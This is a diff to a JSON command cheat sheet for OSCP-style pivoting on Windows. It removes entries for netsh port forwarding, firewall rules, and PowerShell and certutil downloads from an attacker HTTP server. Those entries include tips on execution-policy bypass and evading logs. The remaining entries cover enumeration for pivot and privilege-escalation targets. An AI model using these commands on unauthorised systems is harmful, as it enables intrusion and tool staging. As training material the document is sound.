@@ -2,118 +2,19 @@
   "category": "pivoting",
   "commands": [
     {
-      "id": "netsh-portproxy-add",
-      "name": "Netsh Add Port Forward",
-      "category": "pivoting",
-      "subcategory": "windows-tunneling",
-      "command": "netsh interface portproxy add v4tov4 listenaddress=<LISTEN_IP> listenport=<LISTEN_PORT> connectaddress=<DEST_IP> connectport=<DEST_PORT>",
-      "description": "Add Windows native port forward using netsh - requires administrator privileges, survives reboots",
-      "tags": ["NETSH", "WINDOWS", "PORT_FORWARD", "PIVOTING", "OSCP:HIGH", "ADMIN_REQUIRED"],
-      "variables": [
-        {
-          "name": "<LISTEN_IP>",
-          "description": "IP address to listen on (0.0.0.0 for all interfaces, specific IP for single interface)",
-          "example": "0.0.0.0",
-          "required": true
-        },
-        {
-          "name": "<LISTEN_PORT>",
-          "description": "Port to listen on (Windows side)",
-          "example": "2222",
-          "required": true
-        },
-        {
-          "name": "<DEST_IP>",
-          "description": "Destination IP address to forward to",
-          "example": "172.16.50.217",
-          "required": true
-        },
-        {
-          "name": "<DEST_PORT>",
-          "description": "Destination port to forward to",
-          "example": "22",
-          "required": true
-        }
-      ],
-      "flag_explanations": {
-        "interface portproxy": "Netsh context for IPv4-to-IPv4 port proxy configuration",
-        "add v4tov4": "Add IPv4-to-IPv4 port forwarding rule",
-        "listenaddress": "Local IP to bind listener (0.0.0.0 = all interfaces)",
-        "listenport": "Local port for incoming connections",
-        "connectaddress": "Remote IP to forward traffic to",
-        "connectport": "Remote port to forward traffic to"
-      },
-      "success_indicators": [
-        "Ok. message (no error output)",
-        "netstat -an shows LISTENING on <LISTEN_PORT>",
-        "netsh interface portproxy show all displays new rule",
-        "Firewall rule allows inbound on <LISTEN_PORT>",
-        "External clients can connect to <LISTEN_IP>:<LISTEN_PORT>"
-      ],
-      "failure_indicators": [
-        "Access is denied - not running as administrator",
-        "Port already in use - choose different listen port",
-        "The parameter is incorrect - syntax error in command",
-        "Connection refused from external client - firewall blocking or listen IP wrong"
-      ],
-      "next_steps": [
-        "Verify port forward: netsh interface portproxy show all",
-        "Check listening ports: netstat -an | findstr <LISTEN_PORT>",
-        "Add firewall rule: netsh advfirewall firewall add rule name=\"Port Forward <PORT>\" protocol=TCP dir=in localport=<LISTEN_PORT> action=allow",
-        "Test from attacker: nc -zv <WINDOWS_IP> <LISTEN_PORT>",
-        "Remove when done: netsh interface portproxy delete v4tov4 listenport=<LISTEN_PORT> listenaddress=<LISTEN_IP>"
-      ],
-      "alternatives": [
-        "plink-remote-forward - SSH-based tunnel without admin rights",
-        "ssh-remote-port-forward - If OpenSSH available on Windows (1803+)",
-        "socat-port-forward - Cross-platform alternative"
-      ],
-      "prerequisites": [
-        "Administrator privileges: whoami /priv shows SeDebugPrivilege",
-        "Windows Firewall allows inbound (or create rule with netsh-firewall-add-rule)",
-        "Destination IP routable from Windows host: Test-NetConnection <DEST_IP> -Port <DEST_PORT>"
-      ],
-      "troubleshooting": {
-        "Access is denied": "Run cmd.exe as Administrator: Right-click → Run as administrator, or elevate with UAC bypass if admin user",
-        "Port already in use": "Find conflicting process: netstat -ano | findstr <PORT>, kill process: taskkill /PID <PID> /F",
-        "Firewall blocking inbound": "Add firewall rule: netsh advfirewall firewall add rule name=\"Allow <PORT>\" protocol=TCP dir=in localport=<PORT> action=allow",
-        "Rule persists after removal": "Flush all rules: netsh interface portproxy reset, or reboot Windows"
-      },
-      "notes": "Netsh portproxy is Windows native port forwarding - no third-party tools required. Advantages: Survives reboots, integrates with Windows Firewall, supports persistent configuration. Disadvantages: Requires admin, no encryption, logs connections. OSCP pattern: Use on dual-homed Windows hosts to pivot from DMZ to internal network. Critical: Add firewall rule or portproxy listener won't be accessible externally. Cleanup: netsh interface portproxy delete v4tov4 listenport=<PORT> listenaddress=<IP> and remove firewall rule. Time estimate: 2-3 minutes including firewall configuration.",
-      "oscp_relevance": "high"
-    },
-    {
-      "id": "netsh-portproxy-show",
-      "name": "Netsh Show Port Forwards",
-      "category": "pivoting",
-      "subcategory": "windows-tunneling",
-      "command": "netsh interface portproxy show all",
-      "description": "Display all active netsh port forwarding rules - enumerate existing tunnels",
-      "tags": ["NETSH", "WINDOWS", "ENUMERATION", "OSCP:MEDIUM"],
-      "variables": [],
-      "flag_explanations": {
-        "show all": "Display all IPv4-to-IPv4 port proxy configurations"
-      },
-      "success_indicators": [
-        "Table shows Listen on ipv4: and Connect to ipv4: columns",
-        "Active port forwards listed with addresses and ports",
-        "Empty table if no port forwards configured"
-      ],
-      "failure_indicators": [],
-      "alternatives": [],
-      "prerequisites": [],
-      "troubleshooting": {},
-      "notes": "Quick check for existing port forwards on compromised Windows host. Useful during enumeration to discover internal network routing configured by administrators.",
-      "oscp_relevance": "medium"
-    },
-    {
       "id": "netsh-portproxy-delete",
       "name": "Netsh Delete Port Forward",
       "category": "pivoting",
       "subcategory": "windows-tunneling",
       "command": "netsh interface portproxy delete v4tov4 listenport=<LISTEN_PORT> listenaddress=<LISTEN_IP>",
       "description": "Remove netsh port forwarding rule - cleanup after pivoting",
-      "tags": ["NETSH", "WINDOWS", "CLEANUP", "OSCP:MEDIUM", "ADMIN_REQUIRED"],
+      "tags": [
+        "NETSH",
+        "WINDOWS",
+        "CLEANUP",
+        "OSCP:MEDIUM",
+        "ADMIN_REQUIRED"
+      ],
       "variables": [
         {
           "name": "<LISTEN_PORT>",
@@ -140,9 +41,7 @@
         "Element not found - wrong listenport or listenaddress"
       ],
       "alternatives": [],
-      "prerequisites": [
-        "Administrator privileges"
-      ],
+      "prerequisites": [],
       "troubleshooting": {
         "Element not found": "Verify exact rule: netsh interface portproxy show all, ensure listenaddress matches (e.g., 0.0.0.0 vs 192.168.x.x)",
         "Access denied": "Run as Administrator"
@@ -151,252 +50,17 @@
       "oscp_relevance": "medium"
     },
     {
-      "id": "netsh-firewall-add-rule",
-      "name": "Netsh Add Firewall Rule",
-      "category": "pivoting",
-      "subcategory": "windows-tunneling",
-      "command": "netsh advfirewall firewall add rule name=\"<RULE_NAME>\" protocol=TCP dir=in localport=<PORT> action=allow",
-      "description": "Add Windows Firewall rule to allow inbound connections - required for netsh portproxy external access",
-      "tags": ["NETSH", "WINDOWS", "FIREWALL", "OSCP:HIGH", "ADMIN_REQUIRED"],
-      "variables": [
-        {
-          "name": "<RULE_NAME>",
-          "description": "Descriptive name for firewall rule",
-          "example": "Port Forward 2222",
-          "required": true
-        },
-        {
-          "name": "<PORT>",
-          "description": "Port to allow (must match portproxy listenport)",
-          "example": "2222",
-          "required": true
-        }
-      ],
-      "flag_explanations": {
-        "advfirewall firewall": "Windows Advanced Firewall context (replaces legacy 'netsh firewall')",
-        "add rule": "Create new firewall rule",
-        "name": "Rule name (displayed in firewall GUI)",
-        "protocol": "Protocol type (TCP, UDP, or any)",
-        "dir": "Direction - in (inbound) or out (outbound)",
-        "localport": "Port number to allow",
-        "action": "Action to take - allow or block"
-      },
-      "success_indicators": [
-        "Ok. message",
-        "netsh advfirewall firewall show rule name=\"<RULE_NAME>\" displays rule",
-        "External connections to <PORT> no longer blocked"
-      ],
-      "failure_indicators": [
-        "Access is denied - need administrator",
-        "Rule already exists - use different name or delete existing first"
-      ],
-      "next_steps": [
-        "Verify rule: netsh advfirewall firewall show rule name=\"<RULE_NAME>\"",
-        "Test connectivity: From attacker: nc -zv <WINDOWS_IP> <PORT>",
-        "List all rules: netsh advfirewall firewall show rule name=all"
-      ],
-      "alternatives": [],
-      "prerequisites": [
-        "Administrator privileges"
-      ],
-      "troubleshooting": {
-        "Access denied": "Run as Administrator",
-        "Rule already exists": "Delete existing: netsh advfirewall firewall delete rule name=\"<RULE_NAME>\", or use different name",
-        "Port still blocked": "Check firewall state: netsh advfirewall show allprofiles state, ensure profile is active"
-      },
-      "notes": "Required companion command for netsh-portproxy-add. Netsh portproxy listens on port but Windows Firewall blocks external access by default. This rule allows inbound connections. OSCP pattern: Add rule → Set up port forward → Access internal service → Delete rule when done. Time estimate: 30 seconds.",
-      "oscp_relevance": "high"
-    },
-    {
-      "id": "netsh-firewall-delete-rule",
-      "name": "Netsh Delete Firewall Rule",
-      "category": "pivoting",
-      "subcategory": "windows-tunneling",
-      "command": "netsh advfirewall firewall delete rule name=\"<RULE_NAME>\"",
-      "description": "Remove Windows Firewall rule - cleanup after pivoting",
-      "tags": ["NETSH", "WINDOWS", "FIREWALL", "CLEANUP", "OSCP:MEDIUM", "ADMIN_REQUIRED"],
-      "variables": [
-        {
-          "name": "<RULE_NAME>",
-          "description": "Name of firewall rule to delete (must match exactly)",
-          "example": "Port Forward 2222",
-          "required": true
-        }
-      ],
-      "flag_explanations": {
-        "delete rule": "Remove firewall rule by name"
-      },
-      "success_indicators": [
-        "Deleted 1 rule(s).",
-        "Rule no longer appears in: netsh advfirewall firewall show rule name=all"
-      ],
-      "failure_indicators": [
-        "No rules match the specified criteria - wrong rule name",
-        "Access is denied - need administrator"
-      ],
-      "alternatives": [],
-      "prerequisites": [
-        "Administrator privileges"
-      ],
-      "troubleshooting": {
-        "No rules match": "List all rules to find exact name: netsh advfirewall firewall show rule name=all | findstr <KEYWORD>",
-        "Access denied": "Run as Administrator"
-      },
-      "notes": "Critical for OSCP exam cleanup. Always delete firewall rules created for port forwarding. Pair with netsh-portproxy-delete for complete cleanup.",
-      "oscp_relevance": "medium"
-    },
-    {
-      "id": "netsh-firewall-show",
-      "name": "Netsh Show Firewall State",
-      "category": "pivoting",
-      "subcategory": "windows-tunneling",
-      "command": "netsh advfirewall show allprofiles state",
-      "description": "Display Windows Firewall state for all profiles - check if firewall active",
-      "tags": ["NETSH", "WINDOWS", "FIREWALL", "ENUMERATION", "OSCP:MEDIUM"],
-      "variables": [],
-      "flag_explanations": {
-        "show allprofiles state": "Display firewall state for Domain, Private, and Public profiles"
-      },
-      "success_indicators": [
-        "State shows ON or OFF for each profile",
-        "Domain, Private, Public profiles listed"
-      ],
-      "failure_indicators": [],
-      "alternatives": [],
-      "prerequisites": [],
-      "troubleshooting": {},
-      "notes": "Quick enumeration to check if Windows Firewall enabled. If OFF, no need for netsh-firewall-add-rule. If ON, must create rules for port forwards.",
-      "oscp_relevance": "medium"
-    },
-    {
-      "id": "powershell-wget",
-      "name": "PowerShell File Download",
-      "category": "pivoting",
-      "subcategory": "file-transfer",
-      "command": "powershell -c \"Invoke-WebRequest -Uri <URL> -OutFile <OUTPUT_FILE>\"",
-      "description": "Download files using PowerShell Invoke-WebRequest - Windows native file transfer",
-      "tags": ["POWERSHELL", "WINDOWS", "FILE_TRANSFER", "OSCP:HIGH", "DOWNLOAD"],
-      "variables": [
-        {
-          "name": "<URL>",
-          "description": "Full URL to file (e.g., http://attacker-ip/file.exe)",
-          "example": "http://192.168.45.x/plink.exe",
-          "required": true
-        },
-        {
-          "name": "<OUTPUT_FILE>",
-          "description": "Destination file path on Windows",
-          "example": "plink.exe",
-          "required": true
-        }
-      ],
-      "flag_explanations": {
-        "-c": "Execute PowerShell command",
-        "Invoke-WebRequest": "PowerShell cmdlet for HTTP requests (wget/curl equivalent)",
-        "-Uri": "Source URL to download from",
-        "-OutFile": "Destination file path"
-      },
-      "success_indicators": [
-        "File appears in current directory or specified path",
-        "File size matches source: dir <OUTPUT_FILE>",
-        "No error messages in output"
-      ],
-      "failure_indicators": [
-        "Connection timeout - HTTP server unreachable or firewall blocking",
-        "404 Not Found - wrong URL or file doesn't exist on server",
-        "Access denied - insufficient permissions to write to destination",
-        "Execution policy error - PowerShell execution restricted"
-      ],
-      "next_steps": [
-        "Verify download: dir <OUTPUT_FILE>, check file size",
-        "Calculate hash: certutil -hashfile <OUTPUT_FILE> MD5",
-        "Execute if needed: .<OUTPUT_FILE> or Start-Process <OUTPUT_FILE>"
-      ],
-      "alternatives": [
-        "certutil-download - Alternative Windows native download method",
-        "bitsadmin - Background Intelligent Transfer Service",
-        "curl - Windows 10 1803+ includes curl.exe",
-        "wget - If installed on Windows"
-      ],
-      "prerequisites": [
-        "PowerShell available (default on Windows 7+)",
-        "HTTP server running on attacker machine: python3 -m http.server 80",
-        "Network connectivity to attacker IP"
-      ],
-      "troubleshooting": {
-        "Execution policy restricted": "Bypass with: powershell -ep bypass -c \"Invoke-WebRequest ...\"",
-        "Connection timeout": "Verify server running: sudo netstat -ntplu | grep :80, check firewall allows outbound HTTP",
-        "SSL/TLS error": "Add -UseBasicParsing flag, or disable SSL validation: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12",
-        "File corrupted": "Use binary transfer: -OutFile with -UseBasicParsing, verify hash with certutil"
-      },
-      "notes": "Primary OSCP file transfer method for Windows. PowerShell available by default on Windows 7+. Alternative short syntax: powershell wget <URL> -O <FILE> (alias for Invoke-WebRequest). For stealth: Use certutil (less suspicious in logs). Combine with HTTP server: python3 -m http.server 80 on Kali. Time estimate: 30 seconds - 2 minutes depending on file size and network speed.",
-      "oscp_relevance": "high"
-    },
-    {
-      "id": "certutil-download",
-      "name": "Certutil File Download",
-      "category": "pivoting",
-      "subcategory": "file-transfer",
-      "command": "certutil -urlcache -f <URL> <OUTPUT_FILE>",
-      "description": "Download files using Windows certutil - alternative to PowerShell, less suspicious in logs",
-      "tags": ["CERTUTIL", "WINDOWS", "FILE_TRANSFER", "OSCP:HIGH", "DOWNLOAD"],
-      "variables": [
-        {
-          "name": "<URL>",
-          "description": "Full URL to file",
-          "example": "http://192.168.45.x/plink.exe",
-          "required": true
-        },
-        {
-          "name": "<OUTPUT_FILE>",
-          "description": "Destination file path",
-          "example": "plink.exe",
-          "required": true
-        }
-      ],
-      "flag_explanations": {
-        "-urlcache": "Interact with URL cache",
-        "-f": "Force overwrite if file exists"
-      },
-      "success_indicators": [
-        "****  Online  ****",
-        "CertUtil: -URLCache command completed successfully",
-        "File created in current directory"
-      ],
-      "failure_indicators": [
-        "The requested URL was not found - 404 error",
-        "Connection timeout - server unreachable",
-        "Access is denied - insufficient permissions"
-      ],
-      "next_steps": [
-        "Verify download: dir <OUTPUT_FILE>",
-        "Delete cache entry: certutil -urlcache <URL> delete",
-        "Calculate hash: certutil -hashfile <OUTPUT_FILE> MD5"
-      ],
-      "alternatives": [
-        "powershell-wget - More flexible but more suspicious",
-        "bitsadmin - Background transfer service"
-      ],
-      "prerequisites": [
-        "Certutil available (default on Windows)",
-        "HTTP server running on attacker"
-      ],
-      "troubleshooting": {
-        "Access denied": "Run from writable directory: cd %TEMP%, or use C:\\Windows\\Temp",
-        "Connection timeout": "Verify HTTP server accessible, check Windows Firewall",
-        "File not found after download": "Check current directory: dir, certutil saves to pwd"
-      },
-      "notes": "Certutil is Windows certificate utility that includes URL cache feature. Advantage over PowerShell: Less suspicious in logs (appears as legitimate certificate operation). Disadvantage: Creates cache entry (cleanup with certutil -urlcache <URL> delete). OSCP preference: Use when PowerShell restricted or want to avoid PowerShell event logs. Time estimate: 30 seconds - 1 minute.",
-      "oscp_relevance": "high"
-    },
-    {
       "id": "where-windows",
       "name": "Where - Find Executable",
       "category": "pivoting",
       "subcategory": "enumeration",
       "command": "where <EXECUTABLE>",
       "description": "Locate executable in Windows PATH - verify tool availability",
-      "tags": ["WINDOWS", "ENUMERATION", "OSCP:MEDIUM"],
+      "tags": [
+        "WINDOWS",
+        "ENUMERATION",
+        "OSCP:MEDIUM"
+      ],
       "variables": [
         {
           "name": "<EXECUTABLE>",
@@ -413,9 +77,7 @@
       "failure_indicators": [
         "INFO: Could not find files for the given pattern(s) - executable not in PATH"
       ],
-      "alternatives": [
-        "where /R C:\\ <EXECUTABLE> - Search recursively from C:\\ (slow)"
-      ],
+      "alternatives": [],
       "prerequisites": [],
       "troubleshooting": {},
       "notes": "Quick check for tool availability. Common OSCP checks: where ssh (OpenSSH client), where python, where powershell, where curl. Equivalent to Linux 'which' command.",
@@ -428,7 +90,12 @@
       "subcategory": "enumeration",
       "command": "systeminfo",
       "description": "Display detailed Windows system information - OS version, patches, network config",
-      "tags": ["WINDOWS", "ENUMERATION", "OSCP:HIGH", "SYSTEMINFO"],
+      "tags": [
+        "WINDOWS",
+        "ENUMERATION",
+        "OSCP:HIGH",
+        "SYSTEMINFO"
+      ],
       "variables": [],
       "flag_explanations": {},
       "success_indicators": [
@@ -438,10 +105,7 @@
         "Network Card(s) shows IP configuration"
       ],
       "failure_indicators": [],
-      "alternatives": [
-        "wmic os get caption,version - Specific OS version",
-        "wmic qfe list - Just hotfixes"
-      ],
+      "alternatives": [],
       "prerequisites": [],
       "troubleshooting": {},
       "notes": "Critical OSCP enumeration command. Check: OS version (for exploit research), Hotfix list (missing patches = vulnerabilities), Network adapters (multi-homed = pivot candidate), System Type (32-bit vs 64-bit for exploit selection). Time estimate: 5-10 seconds for output.",
@@ -454,7 +118,12 @@
       "subcategory": "enumeration",
       "command": "whoami /priv",
       "description": "Display current user privileges - check for admin rights and dangerous privileges",
-      "tags": ["WINDOWS", "ENUMERATION", "PRIVESC", "OSCP:HIGH"],
+      "tags": [
+        "WINDOWS",
+        "ENUMERATION",
+        "PRIVESC",
+        "OSCP:HIGH"
+      ],
       "variables": [],
       "flag_explanations": {
         "/priv": "Display user privileges",
@@ -466,10 +135,7 @@
         "SeDebugPrivilege, SeImpersonatePrivilege = high-value for privilege escalation"
       ],
       "failure_indicators": [],
-      "alternatives": [
-        "whoami /all - Complete user info",
-        "whoami /groups - Group memberships"
-      ],
+      "alternatives": [],
       "prerequisites": [],
       "troubleshooting": {},
       "notes": "Critical for privilege escalation assessment. Key privileges: SeImpersonatePrivilege (Potato exploits), SeDebugPrivilege (process injection), SeBackupPrivilege (backup file access), SeRestorePrivilege (file restore), SeLoadDriverPrivilege (driver loading). If high-value privilege present, search for corresponding exploit. Time estimate: immediate.",
@@ -482,7 +148,12 @@
       "subcategory": "enumeration",
       "command": "ipconfig /all",
       "description": "Display detailed network configuration - identify dual-homed hosts and internal subnets",
-      "tags": ["WINDOWS", "ENUMERATION", "NETWORKING", "OSCP:HIGH"],
+      "tags": [
+        "WINDOWS",
+        "ENUMERATION",
+        "NETWORKING",
+        "OSCP:HIGH"
+      ],
       "variables": [],
       "flag_explanations": {
         "/all": "Display full configuration (DNS, WINS, adapters)"
@@ -493,10 +164,7 @@
         "DNS Servers, Default Gateway displayed"
       ],
       "failure_indicators": [],
-      "alternatives": [
-        "ipconfig - Brief output without /all",
-        "Get-NetIPConfiguration - PowerShell equivalent"
-      ],
+      "alternatives": [],
       "prerequisites": [],
       "troubleshooting": {},
       "notes": "Critical OSCP enumeration for pivot identification. Look for: Multiple network adapters (dual-homed = pivot candidate), Internal IP ranges (10.x, 172.16-31.x, 192.168.x = potential pivot targets), DNS servers (identify domain controllers). Common pattern: Host has 192.168.45.x (WAN) and 172.16.50.x (internal) = perfect pivot point. Time estimate: immediate.",
@@ -509,7 +177,12 @@
       "subcategory": "enumeration",
       "command": "netstat -ano",
       "description": "Display all network connections and listening ports with process IDs - enumerate services",
-      "tags": ["WINDOWS", "ENUMERATION", "NETWORKING", "OSCP:HIGH"],
+      "tags": [
+        "WINDOWS",
+        "ENUMERATION",
+        "NETWORKING",
+        "OSCP:HIGH"
+      ],
       "variables": [],
       "flag_explanations": {
         "-a": "Display all connections and listening ports",
@@ -523,10 +196,7 @@
         "ESTABLISHED connections show active communications"
       ],
       "failure_indicators": [],
-      "alternatives": [
-        "netstat -an | findstr LISTENING - Only listening ports",
-        "Get-NetTCPConnection - PowerShell equivalent"
-      ],
+      "alternatives": [],
       "prerequisites": [],
       "troubleshooting": {},
       "notes": "Critical for service enumeration and port forward verification. Use cases: Identify listening ports (potential services), Find established connections (active pivots), Verify port forward active (netstat -ano | findstr <PORT>), Map PID to process (tasklist | findstr <PID>). Combine with netsh-portproxy-show to see full pivot configuration. Time estimate: immediate.",
